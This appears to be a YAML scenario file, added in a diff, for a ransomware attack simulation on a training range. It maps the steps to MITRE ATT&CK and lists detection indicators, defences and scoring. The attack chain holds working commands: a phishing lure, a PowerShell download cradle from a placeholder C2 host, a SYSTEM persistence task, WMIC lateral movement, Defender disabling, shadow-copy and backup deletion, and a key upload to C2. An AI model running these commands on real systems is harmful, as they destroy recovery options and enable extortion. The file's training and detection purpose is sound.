@@ -1,0 +1,361 @@
+# Ransomware Simulation Scenario
+# MITRE ATT&CK: T1486 (Data Encrypted for Impact)
+
+scenario:
+  id: "attack-005"
+  name: "Ransomware Attack Simulation"
+  description: "Complete ransomware attack chain from initial access to encryption"
+  difficulty: "advanced"
+  duration_minutes: 40
+  warning: "⚠️ SIMULATION ONLY - DO NOT run on production systems"
+
+mitre_attack:
+  tactics:
+    - "TA0001"  # Initial Access
+    - "TA0002"  # Execution
+    - "TA0003"  # Persistence
+    - "TA0007"  # Discovery
+    - "TA0040"  # Impact
+
+  techniques:
+    - id: "T1566.001"
+      name: "Phishing: Spearphishing Attachment"
+      tactic: "Initial Access"
+
+    - id: "T1204.002"
+      name: "User Execution: Malicious File"
+      tactic: "Execution"
+
+    - id: "T1059.003"
+      name: "Command and Scripting Interpreter: Windows Command Shell"
+      tactic: "Execution"
+
+    - id: "T1486"
+      name: "Data Encrypted for Impact"
+      tactic: "Impact"
+
+    - id: "T1490"
+      name: "Inhibit System Recovery"
+      tactic: "Impact"
+
+attack_chain:
+  - step: 1
+    name: "Initial Access - Phishing"
+    technique: "T1566.001"
+    description: "Deliver ransomware payload via phishing email"
+    simulation:
+      email:
+        subject: "Urgent: Invoice #{{RANDOM}} - Payment Required"
+        from: "accounting@{{SPOOFED_DOMAIN}}"
+        attachment: "Invoice_{{DATE}}.docx.exe"
+        body: |
+          Dear valued customer,
+
+          Please find attached invoice for immediate payment.
+          Payment is required within 24 hours to avoid service disruption.
+
+          Best regards,
+          Accounting Department
+
+    commands:
+      - tool: "social-engineering-toolkit"
+        args: "create_phishing_email --template invoice --payload {{RANSOMWARE_EXE}}"
+        expected_output: "Phishing email generated"
+
+    success_criteria:
+      - "Email delivered to target"
+      - "Attachment opened by user"
+      - "Payload executed"
+
+  - step: 2
+    name: "Execution - Dropper Deployment"
+    technique: "T1204.002"
+    description: "Execute dropper to download main ransomware payload"
+    commands:
+      - tool: "powershell"
+        args: |
+          IEX (New-Object Net.WebClient).DownloadString('http://{{C2_SERVER}}/stage2.ps1')
+        expected_output: "Main payload downloaded"
+
+      - tool: "scheduled-task"
+        args: |
+          schtasks /create /tn "Windows Update" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM
+        expected_output: "Persistence established"
+
+    success_criteria:
+      - "Main payload retrieved"
+      - "Persistence mechanism created"
+      - "Execution as SYSTEM achieved"
+
+  - step: 3
+    name: "Discovery - Environment Reconnaissance"
+    technique: "T1083"
+    description: "Discover network shares and data locations"
+    commands:
+      - tool: "net"
+        args: "view /all"
+        expected_output: "Network shares discovered"
+
+      - tool: "powershell"
+        args: "Get-SmbShare | Where-Object {$_.Name -notlike '*$'}"
+        expected_output: "Accessible shares listed"
+
+      - tool: "wmic"
+        args: "logicaldisk get name,freespace,size"
+        expected_output: "Drive information retrieved"
+
+    success_criteria:
+      - "Mapped network shares"
+      - "Identified data repositories"
+      - "Located backup systems"
+
+  - step: 4
+    name: "Lateral Movement - Share Access"
+    technique: "T1021.002"
+    description: "Spread to network shares"
+    commands:
+      - tool: "copy"
+        args: "payload.exe \\\\{{TARGET_HOST}}\\C$\\Windows\\Temp\\"
+        expected_output: "Payload copied to remote host"
+
+      - tool: "wmic"
+        args: "/node:{{TARGET_HOST}} process call create 'C:\\Windows\\Temp\\payload.exe'"
+        expected_output: "Remote execution initiated"
+
+    success_criteria:
+      - "Payload deployed to shares"
+      - "Remote execution successful"
+      - "Lateral movement achieved"
+
+  - step: 5
+    name: "Defense Evasion - Disable Protections"
+    technique: "T1562.001"
+    description: "Disable security controls"
+    commands:
+      - tool: "powershell"
+        args: "Set-MpPreference -DisableRealtimeMonitoring $true"
+        expected_output: "Windows Defender disabled"
+
+      - tool: "sc"
+        args: "stop WinDefend && sc config WinDefend start= disabled"
+        expected_output: "Defender service stopped"
+
+      - tool: "reg"
+        args: "add 'HKLM\\Software\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
+        expected_output: "Defender policy disabled"
+
+    success_criteria:
+      - "Antivirus disabled"
+      - "Security services stopped"
+      - "Monitoring tools bypassed"
+
+  - step: 6
+    name: "Impact - Inhibit Recovery"
+    technique: "T1490"
+    description: "Delete backups and shadow copies"
+    commands:
+      - tool: "vssadmin"
+        args: "delete shadows /all /quiet"
+        expected_output: "Shadow copies deleted"
+
+      - tool: "wbadmin"
+        args: "delete catalog -quiet"
+        expected_output: "Backup catalog deleted"
+
+      - tool: "bcdedit"
+        args: "/set {default} recoveryenabled no"
+        expected_output: "Recovery disabled"
+
+      - tool: "wmic"
+        args: "shadowcopy delete"
+        expected_output: "All shadow copies removed"
+
+    success_criteria:
+      - "Shadow copies deleted"
+      - "Backups destroyed"
+      - "Recovery disabled"
+
+  - step: 7
+    name: "Impact - Data Encryption"
+    technique: "T1486"
+    description: "Encrypt files with ransomware"
+    simulation_note: "Uses dummy encryption for safety"
+    commands:
+      - tool: "ransomware-sim"
+        args: |
+          # SIMULATION - No actual encryption
+          Get-ChildItem -Path C:\Users -Recurse -File |
+            Where-Object {$_.Extension -match '\.(doc|xls|pdf|jpg|png)$'} |
+            ForEach-Object {
+              Rename-Item $_.FullName ($_.FullName + '.ENCRYPTED')
+            }
+        expected_output: "Files 'encrypted' (renamed)"
+
+      - tool: "ransom-note"
+        args: |
+          @'
+          YOUR FILES HAVE BEEN ENCRYPTED!
+
+          All your important files have been encrypted with military-grade encryption.
+          To recover your files, you must pay 5 BTC to: {{BTC_ADDRESS}}
+
+          After payment, contact: {{TOR_EMAIL}}
+
+          You have 72 hours before the decryption key is destroyed forever!
+          '@ | Out-File C:\Users\Public\Desktop\DECRYPT_README.txt
+        expected_output: "Ransom note deployed"
+
+    success_criteria:
+      - "Files encrypted (simulated)"
+      - "Ransom note displayed"
+      - "Encryption complete"
+
+  - step: 8
+    name: "Command and Control"
+    technique: "T1071.001"
+    description: "Exfiltrate encryption keys to C2"
+    commands:
+      - tool: "powershell"
+        args: |
+          $key = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("SIMULATION_KEY"))
+          Invoke-WebRequest -Uri "http://{{C2_SERVER}}/keys" -Method POST -Body $key
+        expected_output: "Key uploaded to C2"
+
+    success_criteria:
+      - "Encryption key transmitted"
+      - "C2 communication established"
+      - "Key safely stored"
+
+defense_detection:
+  indicators:
+    - type: "email"
+      description: "Spearphishing attachment"
+      pattern: "Suspicious .exe attachment"
+      severity: "HIGH"
+
+    - type: "file"
+      description: "Ransomware payload"
+      pattern: "Unsigned executable in Temp folder"
+      severity: "CRITICAL"
+
+    - type: "process"
+      description: "Shadow copy deletion"
+      pattern: "vssadmin delete shadows"
+      severity: "CRITICAL"
+
+    - type: "file"
+      description: "Mass file encryption"
+      pattern: "Rapid file extension changes"
+      severity: "CRITICAL"
+
+    - type: "file"
+      description: "Ransom note creation"
+      pattern: "DECRYPT_README.txt creation"
+      severity: "CRITICAL"
+
+    - type: "registry"
+      description: "Windows Defender disabled"
+      pattern: "DisableAntiSpyware = 1"
+      severity: "CRITICAL"
+
+defensive_measures:
+  preventive:
+    - "Email attachment scanning and sandboxing"
+    - "Application whitelisting (AppLocker)"
+    - "Disable PowerShell for standard users"
+    - "Restrict local admin rights"
+    - "Offline/immutable backups"
+    - "Network segmentation"
+
+  detective:
+    - "Monitor vssadmin and wbadmin execution"
+    - "Alert on mass file modifications"
+    - "Detect security service tampering"
+    - "Monitor ransom note keywords"
+    - "Track suspicious PowerShell activity"
+    - "Behavioral ransomware detection"
+
+  responsive:
+    - "Isolate affected systems immediately"
+    - "Kill ransomware processes"
+    - "Restore from backups"
+    - "Wipe and reimage infected systems"
+    - "Reset all credentials"
+    - "Implement recovery procedures"
+
+learning_objectives:
+  - "Understand ransomware attack lifecycle"
+  - "Learn common distribution methods"
+  - "Recognize encryption indicators"
+  - "Practice incident response"
+  - "Understand backup importance"
+
+difficulty_modifiers:
+  easy:
+    - "Single workstation target"
+    - "No lateral movement"
+    - "Simple detection signatures"
+
+  hard:
+    - "Enterprise network target"
+    - "Advanced evasion techniques"
+    - "Multi-stage encryption"
+    - "Backup destruction mechanisms"
+    - "EDR bypass methods"
+
+scoring:
+  max_points: 1600
+  breakdown:
+    initial_access: 200
+    execution: 200
+    discovery: 150
+    lateral_movement: 250
+    disable_protections: 200
+    inhibit_recovery: 300
+    encryption: 300
+
+  time_penalty:
+    detected_early: -500
+    detected_mid: -250
+    detected_late: -100
+
+  recovery_bonus:
+    backups_intact: 500
+    quick_restoration: 300
+    minimal_impact: 200
+
+environment:
+  required_tools:
+    - powershell
+    - wmic
+    - vssadmin
+    - social-engineering-toolkit
+
+  target_network:
+    domain: "CORP.SYNOS.LOCAL"
+    users: 100
+    workstations: 50
+    servers: 5
+    file_shares: 10
+
+  simulation_safety:
+    - "⚠️ NO ACTUAL ENCRYPTION - Files only renamed"
+    - "⚠️ Backup snapshots taken before simulation"
+    - "⚠️ Automatic rollback after 30 minutes"
+    - "⚠️ All actions logged for review"
+    - "⚠️ Isolated test environment required"
+
+recovery_procedures:
+  automated_rollback:
+    - "Restore shadow copies"
+    - "Remove .ENCRYPTED extensions"
+    - "Delete ransom notes"
+    - "Re-enable security services"
+    - "Clear scheduled tasks"
+
+  manual_verification:
+    - "Verify file integrity"
+    - "Check backup status"
+    - "Audit security settings"
+    - "Review incident logs"
+    - "Update detection rules"
